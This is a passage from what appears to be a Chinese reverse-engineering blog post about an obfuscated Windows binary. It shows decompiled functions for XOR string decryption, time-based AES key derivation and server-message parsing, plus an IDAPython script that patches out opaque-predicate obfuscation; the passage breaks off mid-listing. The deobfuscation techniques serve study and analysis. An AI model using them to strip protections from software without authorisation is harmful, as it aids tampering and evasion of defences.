class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">      <span class="built_in">memset</span>(&amp;buf__11, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__11)); <span class="comment">//初始化区域</span></span><br><span class="line">      v89 = <span class="built_in">sub_7FF6B5CF3CE0</span>(&amp;buf__11);</span><br><span class="line">      Source_10 = (<span class="type">char</span> *)<span class="built_in">sub_7FF6B5EA6AB0</span>(v89); <span class="comment">//执行sub_7FF6B5FBA820(v89);</span></span><br><span class="line">      v91 = <span class="built_in">strcpy</span>(Destination__7, Source_10);</span><br><span class="line">      v14 = (<span class="type">unsigned</span> __int8 *)<span class="built_in">sub_7FF6B5EEEE40</span>(v91, <span class="number">0</span>); <span class="comment">//提取v91的第一个字节</span></span><br><span class="line">      Size = <span class="built_in">sub_7FF6B5EEEC30</span>(v135, *v14, <span class="number">0</span>); <span class="comment">//在字符串中查找分隔符并分隔两个部分</span></span><br><span class="line">      `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(Destination__7);</span><br><span class="line">      <span class="keyword">if</span> ( Size != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v92 = <span class="built_in">sub_7FF6B5EEEBD0</span>(v135, v119, <span class="number">0</span>, Size); <span class="comment">//提取第一部分</span></span><br><span class="line">        v93 = v92;</span><br><span class="line">        <span class="built_in">sub_7FF6B5C52650</span>(p_machine_data_struct, v92); <span class="comment">//写入偏移量192</span></span><br><span class="line">        `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v119);</span><br><span class="line">        v94 = <span class="built_in">sub_7FF6B5EEEBD0</span>(v135, v120, Size + <span class="number">1</span>, <span class="number">0xFFFFFFFFFFFFFFFFuLL</span>); <span class="comment">//提取第二部分</span></span><br><span class="line">        v95 = v94;</span><br><span class="line">        <span class="built_in">sub_7FF6B5C549D0</span>(p_machine_data_struct, v94); <span class="comment">//写入偏移量224</span></span><br><span class="line">        ...</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_7FF6B5FBA820</span><span class="params">(<span class="type">unsigned</span> __int16 *a1)</span> <span class="comment">//如果a1的长度大于2，解密a1，截断a1到2字节</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a1[<span class="number">2</span>])</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (n5 &lt; <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        a1[n2] ^= <span class="number">0xCBA5210905978DBFuLL</span> &gt;&gt; (<span class="number">8</span> * (n2 &amp; <span class="number">7u</span>));</span><br><span class="line">        ++n2;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( n2 &lt; <span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//...上文的SIMD指令集表达...</span></span><br><span class="line">    &#125;</span><br><span class="line">    a1[<span class="number">2</span>]= <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> **__fastcall <span class="title">sub_7FF6B5C52650</span><span class="params">(__int64 p_machine_data_struct, _QWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( (_QWORD *)(p_machine_data_struct + <span class="number">192</span>) != a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2[<span class="number">3</span>] &gt; <span class="number">0xFu</span> )</span><br><span class="line">      a2 = (_QWORD *)*a2;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_7FF6B5EEEEC0</span>((<span class="type">void</span> **)(p_machine_data_struct + <span class="number">192</span>), a2, v2[<span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> **__fastcall <span class="title">sub_7FF6B5C549D0</span><span class="params">(__int64 p_machine_data_struct, _QWORD *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v2 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( (_QWORD *)(p_machine_data_struct + <span class="number">224</span>) != a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2[<span class="number">3</span>] &gt; <span class="number">0xFu</span> )</span><br><span class="line">      a2 = (_QWORD *)*a2;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sub_7FF6B5EEEEC0</span>((<span class="type">void</span> **)(p_machine_data_struct + <span class="number">224</span>), a2, v2[<span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器传回的信息中的密文会被切片后填入结构体的偏移量192和224的位置</p>
<p>继续反混淆func2和3（func3还有一个<font color=lime><strong>try…catch</strong></font>块<font color=violet><strong>0x7FF6B607BA13</strong></font>），由于大函数均采用这种模式，所以可以进一步编写自动化脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">START_EA = <span class="number">0x7FF6B5CF3E60</span> <span class="comment"># 0x7FF6B5D57960 &amp; 0x7FF6B607BA13 for func3</span></span><br><span class="line">END_EA   = <span class="number">0x7FF6B5D4C036</span> <span class="comment"># 0x7FF6B5E1E490 &amp; 0x7FF6B6081AE4 for func3</span></span><br><span class="line"></span><br><span class="line">MAX_SEARCH_DEPTH = <span class="number">0x100000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_mov_cs_n_symbol</span>(<span class="params">insn</span>):</span><br><span class="line">    <span class="keyword">if</span> insn.get_canon_mnem() != <span class="string">&quot;mov&quot;</span>: <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    op0 = insn.ops[<span class="number">0</span>]</span><br><span class="line">    op1 = insn.ops[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> op0.<span class="built_in">type</span> != idaapi.o_reg: <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    disasm = idc.GetDisasm(insn.ea)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> disasm: <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;cs:\s*n[a-zA-Z0-9_]&#x27;</span>, disasm)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>: <span class="keyword">return</span> <span class="literal">True</span>, op0.reg</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_xor_test_jnz_pattern</span>(<span class="params">start_ea, target_reg, max_end_ea</span>):</span><br><span class="line">    ea = start_ea</span><br><span class="line">    steps = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> ea &lt; max_end_ea <span class="keyword">and</span> steps &lt; MAX_SEARCH_DEPTH:</span><br><span class="line">        insn = idaapi.insn_t()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> idaapi.decode_insn(insn, ea):</span><br><span class="line">            ea += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> insn.get_canon_mnem() == <span class="string">&quot;xor&quot;</span>:</span><br><span class="line">            op0, op1 = insn.ops[<span class="number">0</span>], insn.ops[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> (op0.<span class="built_in">type</span> == idaapi.o_reg <span class="keyword">and</span> op1.<span class="built_in">type</span> == idaapi.o_reg <span class="keyword">and</span></span><br><span class="line">                op0.reg == target_reg <span class="keyword">and</span> op1.reg == target_reg):</span><br><span class="line">                ea += insn.size</span><br><span class="line">                steps += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        ea += insn.size</span><br><span class="line">        steps += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    insn = idaapi.insn_t()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> idaapi.decode_insn(insn, ea): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> insn.get_canon_mnem() != <span class="string">&quot;test&quot;</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    op0, op1 = insn.ops[<span class="number">0</span>], insn.ops[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (op0.<span class="built_in">type</span> == idaapi.o_reg <span class="keyword">and</span> op1.<span class="built_in">type</span> == idaapi.o_reg <span class="keyword">and</span> op0.reg == target_reg <span class="keyword">and</span> op1.reg == target_reg): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    ea += insn.size</span><br><span class="line">    insn = idaapi.insn_t()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> idaapi.decode_insn(insn, ea): <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> insn.get_canon_mnem() != <span class="string">&quot;jnz&quot;</span>: <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> ea</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop_range</span>(<span class="params">start, end</span>):</span><br><span class="line">    ea = start</span><br><span class="line">    <span class="keyword">while</span> ea &lt;= end:</span><br><span class="line">        size = idc.get_item_size(ea)</span><br><span class="line">        <span class="keyword">if</span> size &lt;= <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">        idaapi.patch_bytes(ea, <span class="string">b&quot;\x90&quot;</span> * size)</span><br><span class="line">        <span class="comment"># print(f&quot;NOPed instruction at &#123;ea:#x&#125;&quot;)</span></span><br><span class="line">        ea += size</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Searching for &#x27;mov reg, cs:nxxx&#x27; -&gt; &#x27;xor/test/jnz&#x27; in [<span class="subst">&#123;START_EA:#x&#125;</span>, <span class="subst">&#123;END_EA:#x&#125;</span>)&quot;</span>)</span><br><span class="line">    ea = START_EA</span><br><span class="line">    <span class="keyword">while</span> ea &lt; END_EA:</span><br><span class="line">        insn = idaapi.insn_t()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> idaapi.decode_insn(insn, ea):</span><br><span class="line">            ea += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        is_match, reg = is_mov_cs_n_symbol(insn)</span><br><span class="line">        <span class="keyword">if</span> is_match:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found &#x27;mov ..., cs:n...&#x27; at <span class="subst">&#123;ea:#x&#125;</span> (reg=<span class="subst">&#123;reg&#125;</span>)&quot;</span>)</span><br><span class="line">            jnz_ea = find_xor_test_jnz_pattern(ea + insn.size, reg, END_EA)</span><br><span class="line">            <span class="keyword">if</span> jnz_ea <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;    -&gt; Full pattern found! jnz at <span class="subst">&#123;jnz_ea:#x&#125;</span>&quot;</span>)</span><br><span class="line">                nop_range(ea, jnz_ea)</span><br><span class="line">                ea = jnz_ea + idc.get_item_size(jnz_ea)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>: <span class="built_in">print</span>(<span class="string">f&quot;    -&gt; Pattern tail not found.&quot;</span>)</span><br><span class="line">        ea += insn.size</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>反编译出来的bigfunc2:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">BigFunc2</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_DWORD *)v34 = <span class="number">0</span>;</span><br><span class="line">  Time = <span class="built_in">time64</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">gmtime64_s</span>(&amp;Tm, &amp;Time);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line">  v2 = <span class="built_in">sub_7FF64A6CC040</span>((__int64)&amp;buf);</span><br><span class="line">  Format = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_7FF64A81EFB0</span>(v2);</span><br><span class="line">  <span class="built_in">strftime</span>(Buffer, <span class="number">3u</span>, Format, &amp;Tm);</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="type">char</span> *)time_H, Buffer);</span><br><span class="line">  <span class="built_in">memset_with_0</span>(v161, <span class="number">0x18u</span>);</span><br><span class="line">  v57 = <span class="built_in">cp_arg2plus192_arg1</span>(a2, v143);</span><br><span class="line">  v59 = v57;</span><br><span class="line">  v58 = (_QWORD *)<span class="built_in">cp_arg2plus160_arg1</span>(a2, v140);</span><br><span class="line">  v60 = v58;</span><br><span class="line">  <span class="built_in">GEN_AES_KEY</span>((<span class="type">unsigned</span> __int64)v161, v58, v59, time_H);</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v140);</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v143);</span><br><span class="line">  *(_QWORD *)&amp;v169 = <span class="number">0x706050403020100LL</span>;</span><br><span class="line">  *((_QWORD *)&amp;v169 + <span class="number">1</span>) = <span class="number">0xF0E0D0C0B0A0908LL</span>;</span><br><span class="line">  <span class="built_in">sub_7FF64A5D73D0</span>(a2, v159);</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v33) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v4) = <span class="number">32</span>;</span><br><span class="line">  <span class="built_in">sub_7FF64A8540E0</span>(v159, v163, <span class="number">0xFFFFFFFFLL</span>, v4, v33, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset_with_0</span>(v154, <span class="number">0x18u</span>);</span><br><span class="line">  <span class="built_in">sub_7FF64A616E40</span>(v154, v163);</span><br><span class="line">  v5 = <span class="built_in">sub_7FF64A5A1F60</span>(v161);</span><br><span class="line">  <span class="built_in">sub_7FF64A5F0530</span>((__int64)v167, v5, &amp;v169);</span><br><span class="line">  dst_ = <span class="built_in">sub_7FF64A854A20</span>(v154);</span><br><span class="line">  v6 = (_BYTE *)<span class="built_in">sub_7FF64A5A1F60</span>(v154);</span><br><span class="line">  <span class="built_in">AES_CBC_ENC</span>((__int64)v167, v6, dst_);</span><br><span class="line">  <span class="built_in">memset</span>(buf_1, <span class="number">0</span>, <span class="number">1u</span>);</span><br><span class="line">  v7 = <span class="built_in">sub_7FF64A6CC0A0</span>(buf_1);</span><br><span class="line">  p_Destination = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_7FF64A81D0F0</span>(v7);</span><br><span class="line">  v62 = <span class="built_in">strcpy</span>(Destination, p_Destination);</span><br><span class="line">  v63 = v62;</span><br><span class="line">  <span class="built_in">sub_7FF64A9D1C60</span>(v122, v62);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf_, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf_));</span><br><span class="line">  v9 = <span class="built_in">sub_7FF64A6CC100</span>(&amp;buf_);</span><br><span class="line">  Source_1 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_7FF64A81B230</span>(v9);</span><br><span class="line">  v64 = <span class="built_in">strcpy</span>(Destination_, Source_1);</span><br><span class="line">  v65 = v64;</span><br><span class="line">  <span class="built_in">sub_7FF64A9D1C60</span>(v123, v64);</span><br><span class="line">  <span class="built_in">qmemcpy</span>(dst__1, (<span class="type">const</span> <span class="type">void</span> *)<span class="built_in">unknown_libname_29</span>(v136, v122, v124), <span class="built_in">sizeof</span>(dst__1));</span><br><span class="line">  <span class="built_in">sub_7FF64A819330</span>(v124, dst__1);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf__1, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf__1));</span><br><span class="line">  v11 = <span class="built_in">sub_7FF64A6CC160</span>(&amp;buf__1);</span><br><span class="line">  Source_2 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">sub_7FF64A819370</span>(v11);</span><br><span class="line">  v66 = <span class="built_in">strcpy</span>(Destination__1, Source_2);</span><br><span class="line">  v67 = v66;</span><br><span class="line">  <span class="built_in">sub_7FF64A9D1C60</span>(v126, v66);</span><br><span class="line">  jumpbuf_sp = <span class="built_in">sub_7FF64A854A20</span>(v154);</span><br><span class="line">  v13 = <span class="built_in">sub_7FF64A5A1F60</span>(v154);</span><br><span class="line">  v55 = <span class="built_in">sub_7FF64A5FE990</span>(v144, v13, jumpbuf_sp);</span><br><span class="line">  v70 = v55;</span><br><span class="line">  <span class="built_in">sub_7FF64A9D1C60</span>(v127, v55);</span><br><span class="line">  <span class="built_in">qmemcpy</span>(dst__2, (<span class="type">const</span> <span class="type">void</span> *)<span class="built_in">unknown_libname_29</span>(v137, v126, &amp;v128), <span class="built_in">sizeof</span>(dst__2));</span><br><span class="line">  <span class="built_in">sub_7FF64A819330</span>(v125, dst__2);</span><br><span class="line">  <span class="built_in">qmemcpy</span>(dst__3, (<span class="type">const</span> <span class="type">void</span> *)<span class="built_in">unknown_libname_29</span>(v138, v124, v126), <span class="built_in">sizeof</span>(dst__3));</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v14) = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">LOBYTE</span>(v15) = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">sub_7FF64A854740</span>(v158, dst__3, v15, v14);</span><br><span class="line">  `eh vector destructor iterator<span class="string">&#x27;(v124, 24, 2, sub_7FF64A6CC680);</span></span><br><span class="line"><span class="string">  `eh vector destructor iterator&#x27;</span>(v126, <span class="number">24</span>, <span class="number">2</span>, sub_7FF64A6CC680);</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(v144);</span><br><span class="line">  `std::locale::global<span class="string">&#x27;::`1&#x27;</span>::dtor$<span class="number">2</span>(Destination__1);</span><br><span class="line">  `eh vector destructor iterator<span class="string">&#x27;(v122, 24, 2, sub_7FF64A6CC680);</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(Destination_);</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(Destination);</span></span><br><span class="line"><span class="string">  memset_with_0(v165, 0x50u);</span></span><br><span class="line"><span class="string">  v71 = v150;</span></span><br><span class="line"><span class="string">  memset(&amp;buf__2, 0, sizeof(buf__2));</span></span><br><span class="line"><span class="string">  memset(&amp;buf__3, 0, sizeof(buf__3));</span></span><br><span class="line"><span class="string">  v72 = sub_7FF64A853BE0(v150, 0);</span></span><br><span class="line"><span class="string">  v76 = v72;</span></span><br><span class="line"><span class="string">  v16 = sub_7FF64A6CC220(&amp;buf__2);</span></span><br><span class="line"><span class="string">  Source_3 = (const char *)sub_7FF64A8155B0(v16);</span></span><br><span class="line"><span class="string">  v73 = strcpy(Destination__2, Source_3);</span></span><br><span class="line"><span class="string">  v77 = v73;</span></span><br><span class="line"><span class="string">  LOBYTE(v33) = 0;</span></span><br><span class="line"><span class="string">  LOBYTE(v18) = 32;</span></span><br><span class="line"><span class="string">  dst__5 = sub_7FF64A8540E0(v158, v142, 0xFFFFFFFFLL, v18, v33, 0);</span></span><br><span class="line"><span class="string">  dst__4 = dst__5;</span></span><br><span class="line"><span class="string">  v19 = sub_7FF64A6CC1C0(&amp;buf__3);</span></span><br><span class="line"><span class="string">  Source_4 = (const char *)sub_7FF64A817470(v19);</span></span><br><span class="line"><span class="string">  v75 = strcpy(Destination__3, Source_4);</span></span><br><span class="line"><span class="string">  v79 = v75;</span></span><br><span class="line"><span class="string">  sub_7FF64A5AD820(a1, v165, v75, dst__4, v77, v76);</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(Destination__3);</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(v142);</span></span><br><span class="line"><span class="string">  `std::locale::global&#x27;</span>::`<span class="number">1</span><span class="string">&#x27;::dtor$2(Destination__2);</span></span><br><span class="line"><span class="string">  if ( !(unsigned __int8)Concurrency::details::_ContextCallback::_HasCapturedContext(v165)</span></span><br><span class="line"><span class="string">    || *(_DWORD *)(sub_7FF64A5A1F60(v165) + 32) != 200 )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    memset(&amp;buf__4, 0, sizeof(buf__4));</span></span><br><span class="line"><span class="string">    v26 = sub_7FF64A6CC4F0(&amp;buf__4);</span></span><br><span class="line"><span class="string">    Source_5 = (const char *)sub_7FF64A809D30(v26);</span></span><br><span class="line"><span class="string">    v109 = strcpy(Destination__4, Source_5);</span></span><br><span class="line"><span class="string">    v110 = v109;</span></span><br><span class="line"><span class="string">    v28 = sub_7FF64A5A1F70(v165);</span></span><br><span class="line"><span class="string">    sub_7FF64A5F0E60(v110, v28);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  v80 = v151;</span></span><br><span class="line"><span class="string">  v81 = sub_7FF64A853BE0(v151, 0);</span></span><br><span class="line"><span class="string">  v69 = v81;</span></span><br><span class="line"><span class="string">  v82 = sub_7FF64A5A1F60(v165);</span></span><br><span class="line"><span class="string">  LOBYTE(v33) = 0;</span></span><br><span class="line"><span class="string">  LOBYTE(v21) = 1;</span></span><br><span class="line"><span class="string">  v115 = sub_7FF64A9D19D0(v156, v82 + 200, v69, v21, v33);</span></span><br><span class="line"><span class="string">  memset(&amp;buf__5, 0, sizeof(buf__5));</span></span><br><span class="line"><span class="string">  v84 = sub_7FF64A6CC2B0(&amp;buf__5);</span></span><br><span class="line"><span class="string">  Source = (char *)sub_7FF64A8136F0(v84);</span></span><br><span class="line"><span class="string">  v86 = 